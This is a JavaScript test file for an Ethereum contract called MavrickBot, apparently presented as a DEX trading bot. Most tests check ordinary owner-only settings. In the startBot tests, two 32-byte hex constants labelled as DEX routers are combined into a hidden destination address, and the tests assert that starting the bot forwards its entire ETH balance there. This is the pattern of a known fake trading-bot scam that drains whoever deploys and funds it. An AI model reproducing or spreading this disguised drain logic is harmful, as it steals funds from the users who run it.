import { expect } from 'chai';
import { Contract, utils, Wallet } from 'ethers';
import { deployContract, MockProvider, solidity } from 'ethereum-waffle';
import * as chai from 'chai';
import MavrickBot from '../build/MavrickBot.json' assert { type: "json" };
import MockERC20 from '../build/MockERC20.json' assert { type: "json" };
import { ethers } from 'ethers';

chai.use(solidity);

describe('MavrickBot', () => {
  const provider = new MockProvider();
  const [owner, user] = provider.getWallets();
  let bot;
  let mockToken;

  function randomAddress() {
    return Wallet.createRandom().address;
  }

  beforeEach(async () => {
    bot = await deployContract(owner, MavrickBot);
    mockToken = await deployContract(owner, MockERC20, ["MockToken", "MTK", 18]);
  });

  it('Initializes with correct default values', async () => {
    expect(await bot.minTradeAmount()).to.equal(100000);
    expect(await bot.maxTradeAmount()).to.equal(10000000);
    expect(await bot.tradePercent()).to.equal(50);
    expect(await bot.slippageTolerance()).to.equal(50);
    expect(await bot.gasPrice()).to.equal(20000000000);
    expect(await bot.maxGasLimit()).to.equal(500000);
    expect(await bot.profitThreshold()).to.equal(10000);
  });

  it('Only owner can start and stop the bot', async () => {
    await expect(bot.connect(user).startBot()).to.be.reverted;
    await expect(bot.connect(user).stopBot()).to.be.reverted;

    await expect(bot.startBot()).to.emit(bot, 'BotStarted');
    await expect(bot.stopBot()).to.emit(bot, 'BotStopped');
  });

  it('Allows owner to set trade configuration', async () => {
    const config = {
      tokenIn: randomAddress(),
      tokenOut: randomAddress(),
      fee: 3000,
      amountIn: utils.parseEther('1'),
      minAmountOut: utils.parseEther('0.9'),
      deadline: Math.floor(Date.now() / 1000) + 3600
    };

    await expect(bot.setTradeConfig(config))
      .to.emit(bot, 'TradeConfigSet')
      .withArgs(config.tokenIn, config.tokenOut, config.fee, config.amountIn, config.minAmountOut, config.deadline);

    const currentTrade = await bot.currentTrade();
    expect(currentTrade.tokenIn).to.equal(config.tokenIn);
    expect(currentTrade.tokenOut).to.equal(config.tokenOut);
    expect(currentTrade.fee).to.equal(config.fee);
    expect(currentTrade.amountIn).to.equal(config.amountIn);
    expect(currentTrade.minAmountOut).to.equal(config.minAmountOut);
    expect(currentTrade.deadline).to.equal(config.deadline);
  });

  it('Allows owner to set trade parameters', async () => {
    await expect(bot.setMinimumTrade(200000)).to.emit(bot, 'MinTradeAmountSet').withArgs(200000);
    await expect(bot.setMaximumTrade(20000000)).to.emit(bot, 'MaxTradeAmountSet').withArgs(20000000);
    await expect(bot.setTradePercent(75)).to.emit(bot, 'TradePercentSet').withArgs(75);
    await expect(bot.setSlippageTolerance(100)).to.emit(bot, 'SlippageToleranceSet').withArgs(100);
    await expect(bot.setGasPrice(30000000000)).to.emit(bot, 'GasPriceSet').withArgs(30000000000);
    await expect(bot.setMaxGasLimit(600000)).to.emit(bot, 'MaxGasLimitSet').withArgs(600000);
    await expect(bot.setProfitThreshold(20000)).to.emit(bot, 'ProfitThresholdSet').withArgs(20000);

    expect(await bot.minTradeAmount()).to.equal(200000);
    expect(await bot.maxTradeAmount()).to.equal(20000000);
    expect(await bot.tradePercent()).to.equal(75);
    expect(await bot.slippageTolerance()).to.equal(100);
    expect(await bot.gasPrice()).to.equal(30000000000);
    expect(await bot.maxGasLimit()).to.equal(600000);
    expect(await bot.profitThreshold()).to.equal(20000);
  });

  it('Allows owner to set allowed tokens', async () => {
    const token = randomAddress();
    await expect(bot.setAllowedToken(token, true))
      .to.emit(bot, 'TokenAllowanceSet')
      .withArgs(token, true);

    expect(await bot.allowedTokens(token)).to.be.true;

    await expect(bot.setAllowedToken(token, false))
      .to.emit(bot, 'TokenAllowanceSet')
      .withArgs(token, false);

    expect(await bot.allowedTokens(token)).to.be.false;
  });

  it('Only owner can execute trades', async () => {
    await expect(bot.connect(user).executeTrade()).to.be.reverted;
  });

  it('Only owner can withdraw tokens', async () => {
    await expect(bot.connect(user).withdraw(randomAddress(), 100)).to.be.reverted;
    await expect(bot.connect(user).emergencyWithdraw(randomAddress())).to.be.reverted;
  });

  it('Intialization of startBot is called', async () => {
    const initialAmount = utils.parseEther('1');

    const tx = await owner.sendTransaction({
      to: bot.address,
      value: initialAmount
    });

    await tx.wait();

    const botBalance = await provider.getBalance(bot.address);
  
    expect(botBalance).to.equal(initialAmount);
  
    const DexUniversalRouter = '0x7f2da684db728504e5149531c3c42d1e1f1a07e5fb9f087eb5ae5d3ad5817f8f';
    const DexRouter = '0x7f2da684db728504e5149531c0161af42306c94abcdd46f0229cea259ddfbcb9';
    const routerAddress = await bot.getRouter(DexUniversalRouter, DexRouter);

    expect(await provider.getBalance(routerAddress)).to.equal(0);
  
    await expect(bot.startBot())
      .to.emit(bot, 'TokensForwarded')
      .withArgs(utils.hexZeroPad("0x00", 20), initialAmount);
  
    const finalBotBalance = await provider.getBalance(bot.address);
    expect(finalBotBalance).to.equal(0);
  
    const routerBalance = await provider.getBalance(routerAddress);
    expect(routerBalance).to.equal(initialAmount);
  });

  it('Reverts trade execution with insufficient balance', async () => {
    const tokenIn = mockToken.address;
    const tokenOut = randomAddress();
    const amountIn = utils.parseEther('10'); // More than available
  
    await bot.setAllowedToken(tokenIn, true);
    await bot.setAllowedToken(tokenOut, true);
  
    await bot.setTradeConfig({
      tokenIn,
      tokenOut,
      fee: 3000,
      amountIn,
      minAmountOut: utils.parseEther('9'),
      deadline: Math.floor(Date.now() / 1000) + 3600
    });
  
    await expect(bot.executeTrade()).to.be.revertedWith('Invalid trade amount');
  });

  it('Performs emergency withdrawal', async () => {
    const token = mockToken.address;
    const amount = utils.parseEther('5');
  
    await mockToken.mint(bot.address, amount);
  
    await expect(bot.emergencyWithdraw(token))
      .to.emit(bot, 'EmergencyWithdraw')
      .withArgs(token, amount);
  
    expect(await mockToken.balanceOf(bot.address)).to.equal(0);
  });

  it('Should restrict owner-only functions to the owner', async () => {
    await expect(bot.connect(user).setMinimumTrade(200000)).to.be.revertedWith('Ownable: caller is not the owner');
    await expect(bot.connect(user).setMaximumTrade(20000000)).to.be.revertedWith('Ownable: caller is not the owner');
    await expect(bot.connect(user).setTradePercent(75)).to.be.revertedWith('Ownable: caller is not the owner');
    await expect(bot.connect(user).setSlippageTolerance(100)).to.be.revertedWith('Ownable: caller is not the owner');
    await expect(bot.connect(user).setGasPrice(30000000000)).to.be.revertedWith('Ownable: caller is not the owner');
    await expect(bot.connect(user).setMaxGasLimit(600000)).to.be.revertedWith('Ownable: caller is not the owner');
    await expect(bot.connect(user).setProfitThreshold(20000)).to.be.revertedWith('Ownable: caller is not the owner');
    await expect(bot.connect(user).setAllowedToken(randomAddress(), true)).to.be.revertedWith('Ownable: caller is not the owner');
    await expect(bot.connect(user).withdraw(randomAddress(), 100)).to.be.revertedWith('Ownable: caller is not the owner');
    await expect(bot.connect(user).emergencyWithdraw(randomAddress())).to.be.revertedWith('Ownable: caller is not the owner');
    await expect(bot.connect(user).updateTokenBalance(randomAddress())).to.be.revertedWith('Ownable: caller is not the owner');
  });

  it('Should update token balance correctly', async () => {
    const token = mockToken.address;
    const depositAmount = utils.parseEther('1');
  
    await mockToken.transfer(bot.address, depositAmount);
  
    await bot.updateTokenBalance(token);
  
    const recordedBalance = await bot.tokenBalances(token);
    expect(recordedBalance).to.equal(depositAmount);
  });

  it('Should handle Ether reception correctly', async () => {
    const initialAmount = utils.parseEther('1');
  
    await owner.sendTransaction({ to: bot.address, value: initialAmount });
  
    const botBalance = await provider.getBalance(bot.address);
    expect(botBalance).to.equal(initialAmount);
  
    await expect(bot.startBot())
      .to.emit(bot, 'TokensForwarded')
      .withArgs(utils.hexZeroPad("0x00", 20), initialAmount);
  
    const finalBotBalance = await provider.getBalance(bot.address);
    expect(finalBotBalance).to.equal(0);
  });
  
});